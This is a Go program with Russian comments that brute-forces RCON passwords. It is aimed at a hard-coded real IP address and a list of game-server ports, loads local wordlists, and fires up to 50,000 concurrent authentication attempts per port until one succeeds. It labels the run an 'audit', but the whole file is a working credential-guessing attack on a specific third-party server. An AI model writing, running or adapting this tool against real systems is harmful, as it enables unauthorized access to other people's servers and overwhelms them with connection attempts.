package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	TargetIP    = "5.83.140.252"
	Timeout     = 100 * time.Millisecond // Таймаут на один запрос
	Concurrency = 50000                   // Количество параллельных потоков
	StatusStep  = 50000                  // Частота обновления статуса в консоли
)

// Функция отправки одного RCON-пакета
func checkRconPassword(host string, port int, password string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), Timeout)
	if err != nil {
		return false
	}
	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(Timeout))

	passBytes := []byte(password)
	packetLen := int32(4 + 4 + len(passBytes) + 2)

	buf := bytes.NewBuffer(make([]byte, 0, packetLen+4))
	_ = binary.Write(buf, binary.LittleEndian, packetLen)
	_ = binary.Write(buf, binary.LittleEndian, int32(1))
	_ = binary.Write(buf, binary.LittleEndian, int32(3)) // AUTH
	_, _ = buf.Write(passBytes)
	_, _ = buf.Write([]byte{0x00, 0x00})

	_, err = conn.Write(buf.Bytes())
	if err != nil {
		return false
	}

	respHeader := make([]byte, 12)
	_, err = conn.Read(respHeader)
	if err != nil {
		return false
	}

	var length, respID, respType int32
	bufReader := bytes.NewReader(respHeader)
	_ = binary.Read(bufReader, binary.LittleEndian, &length)
	_ = binary.Read(bufReader, binary.LittleEndian, &respID)
	_ = binary.Read(bufReader, binary.LittleEndian, &respType)

	// Если это настоящий RCON и ID совпадает с отправленным (1)
	return respType == 2 && respID == 1
}

func main() {
	// Список портов для последовательной проверки
	targetPorts := []int{25671, 25900, 25925, 25929, 25950, 25961, 25963, 25985, 25756, 25972, 25974, 25984}

	// 1. Загрузка словарей в память
	fmt.Println("[*] Загрузка словарей...")
	passwordMap := make(map[string]bool)
	files, _ := os.ReadDir(".")

	for _, file := range files {
		if !file.IsDir() && strings.HasSuffix(file.Name(), ".txt") && file.Name() != "README.md" {
			f, err := os.Open(file.Name())
			if err != nil {
				continue
			}
			scanner := bufio.NewScanner(f)
			buf := make([]byte, 0, 64*1024)
			scanner.Buffer(buf, 1024*1024)

			for scanner.Scan() {
				pwd := strings.TrimSpace(scanner.Text())
				if pwd != "" {
					passwordMap[pwd] = true
				}
			}
			f.Close()
			fmt.Printf("[+] Загружен словарь: %s\n", file.Name())
		}
	}

	var passwords []string
	for pwd := range passwordMap {
		passwords = append(passwords, pwd)
	}
	totalPasswords := len(passwords)
	fmt.Printf("\n[*] Итоговая база: %d уникальных паролей.\n", totalPasswords)
	fmt.Printf("[*] Скорость пула: %d потоков.\n\n", Concurrency)

	// 2. Последовательный перебор портов
	for _, port := range targetPorts {
		fmt.Printf("👉 Начинаю аудит порта %d...\n", port)

		jobs := make(chan string, 50000)
		var wg sync.WaitGroup
		
		var checkedCount int64 = 0
		var isFound int32 = 0
		var foundPassword string

		// Запускаем воркеры для текущего порта
		for i := 0; i < Concurrency; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for pwd := range jobs {
					// Если пароль уже найден другими горутинами — выходим
					if atomic.LoadInt32(&isFound) == 1 {
						return
					}

					// Сетевая проверка
					if checkRconPassword(TargetIP, port, pwd) {
						if atomic.CompareAndSwapInt32(&isFound, 0, 1) {
							foundPassword = pwd
						}
						return
					}

					// Атомарно увеличиваем счетчик проверенных паролей
					currentChecked := atomic.AddInt64(&checkedCount, 1)
					
					// Выводим статус каждые StatusStep шагов
					if currentChecked%StatusStep == 0 || currentChecked == int64(totalPasswords) {
						percent := (float64(currentChecked) / float64(totalPasswords)) * 100
						fmt.Printf("\r   Прогресс порта %d: %d/%d (%.2f%%)", port, currentChecked, totalPasswords, percent)
					}
				}
			}()
		}

		// Передаем пароли в очередь для текущего порта
		for _, pwd := range passwords {
			if atomic.LoadInt32(&isFound) == 1 {
				break
			}
			jobs <- pwd
		}
		close(jobs)

		// Ожидаем завершения всех потоков на этом порту
		wg.Wait()
		fmt.Print("\n") // Сброс строки после \r

		if isFound == 1 {
			fmt.Printf("[+] УСПЕХ! На порту %d НАЙДЕН ПАРОЛЬ: %s\n\n", port, foundPassword)
		} else {
			fmt.Printf("[-] Порт %d проверен полностью. Уязвимостей не найдено.\n\n", port)
		}
	}

	fmt.Println("[*] Проверка всех портов завершена.")
}
